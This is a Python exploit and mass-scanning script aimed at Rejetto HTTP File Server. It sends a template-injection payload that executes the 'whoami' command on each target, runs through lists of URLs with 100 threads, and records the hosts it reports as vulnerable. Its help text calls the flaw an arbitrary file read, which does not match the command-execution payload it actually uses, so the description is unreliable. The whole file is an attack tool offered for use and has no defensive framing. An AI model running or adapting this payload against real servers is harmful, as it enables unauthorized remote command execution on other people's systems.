import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    text = """██╗    ██╗██╗   ██╗        ██╗  ██╗██╗   ██╗
██║    ██║██║   ██║        ██║  ██║██║   ██║
██║ █╗ ██║██║   ██║        ███████║██║   ██║
██║███╗██║██║   ██║        ██╔══██║██║   ██║
╚███╔███╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
               author=芜湖
               version=1.1.1                             """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="Rejetto HTTP文件服务器-任意文件读取")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url ')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')


def poc(target):
    payload = '/?n=%0A&cmd=whoami&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}'
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/83.0.4103.116Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate,br',
        'Connection': 'close',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=5)
        # print(res.text)
        if 'webserver-pc\webserver' in res.text:
            print(f'[+]存在漏洞{target}')
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f'[-]不存在漏洞{target}')
    except:
        print('改站点有问题')


if __name__ == '__main__':
    main()